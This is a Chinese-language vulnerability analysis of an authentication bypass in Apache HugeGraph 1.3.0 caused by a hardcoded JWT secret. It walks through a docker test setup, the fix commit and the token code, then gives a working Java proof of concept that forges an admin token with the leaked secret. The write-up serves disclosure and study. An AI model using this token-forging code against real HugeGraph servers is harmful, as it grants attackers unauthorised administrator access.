<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
<div id="app">
<p>漏洞的通告如下<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107173445-a159298e-ccda-1.png"/><br/>
从漏洞描述和标题标题就可以猜到大概是个什么漏洞了，jwt,Secret,Authentication Bypass，三个关键字大概率就是硬编码的jwt Secret，导致可以伪造Token进行数据操作。</p>
<h2 data-content="1" id="2b0f83934c42f6770e6fe843bc7f7882">环境搭建</h2>
<p><code>docker run -itd --name=graph -e PASSWORD=123456 -p 8080:8080 hugegraph/hugegraph:1.3.0</code><br/>
默认情况下，Apache HugeGraph不启用身份验证，需要手动开启身份验证，参考<a href="https://hugegraph.apache.org/docs/config/config-authentication/" target="_blank">https://hugegraph.apache.org/docs/config/config-authentication/</a> 文档开启身份认证。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107180643-18cbe62e-ccdf-1.png"/><br/>
访问提示401认证</p>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107181030-a0272674-ccdf-1.png"/></p>
<h2 data-content="1" id="1d48028a8e8cea7be60c63fe99bb0430">漏洞分析</h2>
<p>从Github的公告中(<a href="https://github.com/advisories/GHSA-f697-gm3h-xrf9" target="_blank">https://github.com/advisories/GHSA-f697-gm3h-xrf9</a>) 可以看到相关修复commit地址为<br/>
<a href="https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246。" target="_blank">https://github.com/apache/incubator-hugegraph/commit/03b40a52446218c83e98cb43020e0593a744a246。</a><br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107174247-c07cc7a2-ccdb-1.png"/><br/>
之前使用的是硬编码的<code>FXQXbJtbCLxODc6tGci732pkH1cyf8Qg</code>作为Secret来生成jwt Token,修复后使用了随机生成的Base64字符串。<br/>
再确认一下JWT的生成流程，逻辑在hugegraph-server/hugegraph-core/src/main/java/org/apache/hugegraph/auth/TokenGenerator.java中。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107174549-2d17e5b8-ccdc-1.png"/><br/>
可以看到使用Jwt签名使用的Key就是使用硬编码的secret <code>FXQXbJtbCLxODc6tGci732pkH1cyf8Qg</code>通过io.jsonwebtoken.security.Keys.hmacShaKeyFor(secret)生成的。</p>
<div class="highlight"><pre><span></span><span class="n">String</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="n">AuthOptions</span><span class="o">.</span><span class="na">AUTH_TOKEN_SECRET</span><span class="o">);</span>
<span class="k">this</span><span class="o">.</span><span class="na">key</span> <span class="o">=</span> <span class="n">Keys</span><span class="o">.</span><span class="na">hmacShaKeyFor</span><span class="o">(</span><span class="n">secretKey</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span>
</pre></div>
<div class="highlight"><pre><span></span><span class="k">return</span> <span class="n">Jwts</span><span class="o">.</span><span class="na">builder</span><span class="o">()</span>
                   <span class="o">.</span><span class="na">setClaims</span><span class="o">(</span><span class="n">payload</span><span class="o">)</span>
                   <span class="o">.</span><span class="na">setExpiration</span><span class="o">(</span><span class="k">new</span> <span class="n">Date</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">+</span> <span class="n">expire</span><span class="o">))</span>
                   <span class="o">.</span><span class="na">signWith</span><span class="o">(</span><span class="k">this</span><span class="o">.</span><span class="na">key</span><span class="o">,</span> <span class="n">SignatureAlgorithm</span><span class="o">.</span><span class="na">HS256</span><span class="o">)</span>
                   <span class="o">.</span><span class="na">compact</span><span class="o">();</span>
</pre></div>
<p>看一下调用TokenGenerator.create方法的地方,可以在hugegraph-server/hugegraph-core/src/main/java/org/apache/hugegraph/auth/StandardAuthManager.java看到生成JWT时传入payload就是包含用户name和id的一个map，<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107175229-1bd79478-ccdd-1.png"/><br/>
也就是说只要知道用户的name和id就可以生成该用户的合法jwt，冒充该用户进行操作了。</p>
<h2 data-content="1" id="a8278a21c268d5bd24097956a6a9eeb7">漏洞复现</h2>
<p>按照应用的逻辑，生成jwt的代码如下,admin为默认用户名，需要注意的是admin的user_id是-30。</p>
<div class="highlight"><pre><span></span><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Main</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
        <span class="n">String</span> <span class="n">secretKey</span> <span class="o">=</span> <span class="s">"FXQXbJtbCLxODc6tGci732pkH1cyf8Qg"</span><span class="o">;</span>
        <span class="n">SecretKey</span> <span class="n">key</span> <span class="o">=</span> <span class="n">Keys</span><span class="o">.</span><span class="na">hmacShaKeyFor</span><span class="o">(</span><span class="n">secretKey</span><span class="o">.</span><span class="na">getBytes</span><span class="o">(</span><span class="n">StandardCharsets</span><span class="o">.</span><span class="na">UTF_8</span><span class="o">));</span>
        <span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span> <span class="n">payload</span> <span class="o">=</span> <span class="k">new</span> <span class="n">HashMap</span><span class="o">&lt;&gt;();</span>
        <span class="n">payload</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_name"</span><span class="o">,</span><span class="s">"admin"</span><span class="o">);</span>
        <span class="n">payload</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="s">"user_id"</span><span class="o">,</span><span class="s">"-30"</span><span class="o">);</span>
        <span class="n">String</span> <span class="n">token</span> <span class="o">=</span> <span class="n">Jwts</span><span class="o">.</span><span class="na">builder</span><span class="o">()</span>
                <span class="o">.</span><span class="na">setClaims</span><span class="o">(</span><span class="n">payload</span><span class="o">)</span>
                <span class="o">.</span><span class="na">setExpiration</span><span class="o">(</span><span class="k">new</span> <span class="n">Date</span><span class="o">(</span><span class="n">System</span><span class="o">.</span><span class="na">currentTimeMillis</span><span class="o">()</span> <span class="o">+</span> <span class="mi">36000</span><span class="o">))</span>
                <span class="o">.</span><span class="na">signWith</span><span class="o">(</span><span class="n">key</span><span class="o">,</span> <span class="n">SignatureAlgorithm</span><span class="o">.</span><span class="na">HS256</span><span class="o">)</span>
                <span class="o">.</span><span class="na">compact</span><span class="o">();</span>

        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">token</span><span class="o">);</span>
    <span class="o">}</span>
<span class="o">}</span>
</pre></div>
<p>需要用到的组件可以从子项目的pom.xml中找到</p>
<div class="highlight"><pre><span></span><span class="nt">&lt;dependency&gt;</span>
        <span class="nt">&lt;groupId&gt;</span>io.jsonwebtoken<span class="nt">&lt;/groupId&gt;</span>
        <span class="nt">&lt;artifactId&gt;</span>jjwt-api<span class="nt">&lt;/artifactId&gt;</span>
        <span class="nt">&lt;version&gt;</span>0.11.5<span class="nt">&lt;/version&gt;</span>
    <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;dependency&gt;</span>
        <span class="nt">&lt;groupId&gt;</span>io.jsonwebtoken<span class="nt">&lt;/groupId&gt;</span>
        <span class="nt">&lt;artifactId&gt;</span>jjwt-impl<span class="nt">&lt;/artifactId&gt;</span>
        <span class="nt">&lt;version&gt;</span>0.11.5<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
    <span class="nt">&lt;/dependency&gt;</span>
    <span class="nt">&lt;dependency&gt;</span>
        <span class="nt">&lt;groupId&gt;</span>io.jsonwebtoken<span class="nt">&lt;/groupId&gt;</span>
        <span class="nt">&lt;artifactId&gt;</span>jjwt-jackson<span class="nt">&lt;/artifactId&gt;</span>
        <span class="nt">&lt;version&gt;</span>0.11.5<span class="nt">&lt;/version&gt;</span>
        <span class="nt">&lt;scope&gt;</span>runtime<span class="nt">&lt;/scope&gt;</span>
    <span class="nt">&lt;/dependency&gt;</span>
</pre></div>
<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107180451-d61a7250-ccde-1.png"/><br/>
最后使用伪造的Token进行冒充admin用户访问。<br/>
<img src="https://xzfile.aliyuncs.com/media/upload/picture/20250107180507-dfb74c5c-ccde-1.png"/></p>
</div>
</div>